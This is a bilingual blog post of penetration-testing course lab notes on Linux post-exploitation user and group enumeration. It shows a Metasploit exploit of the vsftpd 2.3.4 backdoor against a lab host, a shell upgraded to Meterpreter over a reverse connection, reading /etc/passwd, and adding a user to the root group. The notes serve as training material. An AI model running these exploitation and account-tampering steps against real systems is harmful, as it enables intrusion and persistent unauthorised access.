---
layout: post
title: "Enumerating Users & Groups"
date: "2023-06-11"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Local Enumeration
## Enumerating Users & Groups
After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.

What are we looking for?
* Current user & privileges
* Other users on the system
* Groups

## Demo: Enumerating Users & Groups

# Linux 本地枚举
## 枚举用户和组
在获得对目标系统的初始访问权限后，了解更多有关系统的信息非常重要，例如您可以访问哪些用户帐户以及系统上的其他用户帐户。

我们在寻找什么？

* 当前用户和权限
* 系统上的其他用户
* 组

## 演示：枚举用户和组
Kali Linux : 192.72.78.2

Target IP Address : 192.72.78.3
 
```
msfconsole -q
setg RHOSTS 192.72.78.3
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
exploit
```

Put that into the background.

```
sessions
sessions -u 1
sessions
sessions 2
```

We now have a Meterpreter session.

Get user id, and that will tell you the username.

```
meterpreter > getuid
```

It's instead displaying the user id of the user account. Whenever it says 0, on Linux, the user id 0 is always reserved for the root user. The root user is the Linux equivalent of the administrator account on Windows. It's a user account with the highest level of privileges available on the Linux operating system, or the Linux kernel. So that means we have access to the target system with the root user.

Open up a shell session.

```
meterpreter > shell
```

Open up a bash session here.

```
/bin/bash -i
```

```
cd /root
```

To identify the current user that we have access to, which is root.

```
whoami
```

That means we don't have to perform any privilege escalation, because we currently have access to the system through the root user. And the root user has the highest privileges available on the Linux target. If I had access to the target system via another user account, like bob, then you'd need to identify the privileges associated with that account. When it comes down to Linux, the user account will either be a non-privileged user account or the user account will be part of the root group or the sudo group on Ubuntu. And if the user account is part of that group, it means that they have administrative privileges or root privileges and can run commands with root privileges. That can be done by typing in the command groups and then specifying the user account. If you gained access to a target system with the user account of bob, you would just say `groups bob`. And if it said that user account was part of the root group or the sudo group, then it meant that they have root privileges available.

What groups the root user is a part of.

```
groups root
```

It'll tell you that the root user is a part of the root group.

If you want to get an idea of the other users on a Linux system.

```
cat /etc/passwd
```

This will display a series of both user accounts and service accounts. There's a difference between user accounts and service accounts. The easiest way to distinguish between the two is that a user account, like the root account here, at the end of it, it will have a specification for the shell that has been configured for this particular user account. If it's a user account, you'll typically see that the shell will either be `/bin/bash` or `/bin/sh` for the Bourne shell. If it is a service account, then the shell specified will be `/usr/sbin/nologin`. The reason that is the case is because a service account has not been set up to provide access for users to log into that account, it has been set up to manage a particular service. A good example of this is the `www-data` service account, which has the shell specified as `/usr/sbin/nologin`. This service account is used to manage the Apache web server on a Linux system. So a Linux system will have a collection of service accounts that is used to manage specific services that you cannot explicitly log into via SSH, for example.

And if you want to limit this list to only user accounts, You can cat out the content of the `/etc/passwd` file and then piping out the content and grabbing using the `grep` utility to exclude the `/nologin` string.

```
cat /etc/passwd | grep -v /nologin
```

The structure of how user accounts are specified within the `/etc/passwd` file is the following. Firstly, you have the username. You then have the user id and the group id. For the root user it's always going to be 0, and for the root group it's always going to be 0, as well. You'll then have the home directory of that user, which is going to be in the case of the root user under the `/root` directory and then the shell.

If there was another user account, a standard user account, then the home directory would be stored under the `/home` directory.

```
ls /home
```

`-s`: specify the shell as `/bin/bash`.

It's going to add that user.

```
useradd bob -s /bin/bash
```

```
cat /etc/passwd
```

The home directory is under `/home/bob`.

```
ls -al /home
```

In this case, it's not been created, because we did not specify that when creating a user or when creating the bob user.

We can create another user here.

`-m`: specify the home directory, or we can just use the `-m` flag there.

`-s`: the shell is going to be `/bin/bash`.

```
useradd -m john -s /bin/bash
```

```
cat /etc/passwd
ls -al /home
```

The john home directory or the folder for the user john has been created.

That is how to display the list of user accounts as well as service accounts on a Linux system.

If you want to display the list of groups on a Linux system.

```
groups
```

In this case, the Linux system only has one group righ of here, which is the root group.

If you want to display the members of a group. 

```
groups bob
```

bob is just part of the bob group, which means it's not part of any other group.

If I wanted to add bob to a group

`-aG`: add to group.

I want to add the user bob to the root group.

```
usermod -aG root bob
```

So we're specifying the group that we would like to add bob to and then the user that we would like to add to the root group.

```
groups bob
```

bob is now part of the root group, which means that he has the ability to run commands with root privileges, or administrative privileges.

If you also want to list out a list of currently logged on users, we can do that using the `w` command or we can type in `w` or we can utilize the `who` utility.

```
w
```

```
who
```

We can also utilize the `last` command to show a listing of the last users that logged on to the system.

```
last
```

It doesn't display any information, which means that no users have logged on to the system legitimately.

You're looking at this environment and you've gained access to the target system via the root user, why isn't that being reflected here? This command only displays legitimate connections or authentication that has been made legitimately, either through SSH or through a physical TTY session. 

We can also utilize the `lastlog` command to display a list of users that have logged into the system.

```
lastlog
```

This will sort out the information based on the following columns. The IP address they're connecting from, and when they logged in. In this case, because no user has ever logged in via SSH or have logged in physically, it's not being reflected here. However, if a user logged in via SSH, then it would show you that information.

# Enumerating Users & Groups
## Overview
Goal

This lab covers the process enumerating the users and groups on a target system running Linux.

# 枚举用户和组
## 概述
目标

本实验涵盖在运行 Linux 的目标系统上枚举用户和组的过程。

## 复现视频内容
Kali Linux : 192.141.187.2

Target IP Address : 192.141.187.3

```
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.141.187.3    yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.141.187.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.141.187.3:21 - USER: 331 Please specify the password.
[+] 192.141.187.3:21 - Backdoor service has been spawned, handling...
[+] 192.141.187.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.141.187.2:46211 -> 192.141.187.3:6200) at 2023-06-11 02:55:03 +0000

^Z
Background session 1? [y/N]  y
```

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.141.187.2:46211 -> 192.141.187.3:6200 (192.141.187.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.141.187.2:4433 
[*] Sending stage (985320 bytes) to 192.141.187.3
[*] Meterpreter session 2 opened (192.141.187.2:4433 -> 192.141.187.3:34788) at 2023-06-11 02:56:50 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.141.187.2:46211 -> 192.141.187.3:6200 (192.141.187.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.141.187.3  192.141.187.2:4433 -> 192.141.187.3:34788 (192.141.187.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

```
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > shell
Process 21 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~/vsftpd-2.3.4# cd /root
cd /root
root@victim-1:~#
```

```
root@victim-1:~# whoami
whoami
root
```

```
root@victim-1:~# groups root
groups root
root : root
```

```
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```

```
root@victim-1:~# cat /etc/passwd | grep -v /nologin
cat /etc/passwd | grep -v /nologin
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
_apt:x:100:65534::/nonexistent:/bin/false
```

```
root@victim-1:~# ls /home
ls /home
```

```
root@victim-1:~# useradd bob -s /bin/bash
useradd bob -s /bin/bash
```

```
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
bob:x:1000:1000::/home/bob:/bin/bash
```

```
root@victim-1:~# ls -al /home
ls -al /home
total 8
drwxr-xr-x 2 root root 4096 Jun 26  2018 .
drwxr-xr-x 1 root root 4096 Jun 11 02:51 ..
```

```
root@victim-1:~# useradd -m john -s /bin/bash
useradd -m john -s /bin/bash
```

```
root@victim-1:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
bob:x:1000:1000::/home/bob:/bin/bash
john:x:1001:1001::/home/john:/bin/bash
```

```
root@victim-1:~# ls -al /home
ls -al /home
total 12
drwxr-xr-x 1 root root 4096 Jun 11 03:11 .
drwxr-xr-x 1 root root 4096 Jun 11 02:51 ..
drwxr-xr-x 2 john john 4096 Jun 11 03:11 john
```

```
root@victim-1:~# groups
groups
root
```

```
root@victim-1:~# groups bob
groups bob
bob : bob
```

```
root@victim-1:~# usermod -aG root bob
usermod -aG root bob
```

```
root@victim-1:~# groups bob
groups bob
bob : bob root
```

```
root@victim-1:~# w
w
bash: w: command not found
root@victim-1:~# who
who
```

```
root@victim-1:~# last
last

wtmp begins Wed Apr 26 04:39:33 2023
```

```
root@victim-1:~# lastlog
lastlog
Username         Port     From             Latest
root                                       **Never logged in**
daemon                                     **Never logged in**
bin                                        **Never logged in**
sys                                        **Never logged in**
sync                                       **Never logged in**
games                                      **Never logged in**
man                                        **Never logged in**
lp                                         **Never logged in**
mail                                       **Never logged in**
news                                       **Never logged in**
uucp                                       **Never logged in**
proxy                                      **Never logged in**
www-data                                   **Never logged in**
backup                                     **Never logged in**
list                                       **Never logged in**
irc                                        **Never logged in**
gnats                                      **Never logged in**
nobody                                     **Never logged in**
_apt                                       **Never logged in**
bob                                        **Never logged in**
john                                       **Never logged in**
```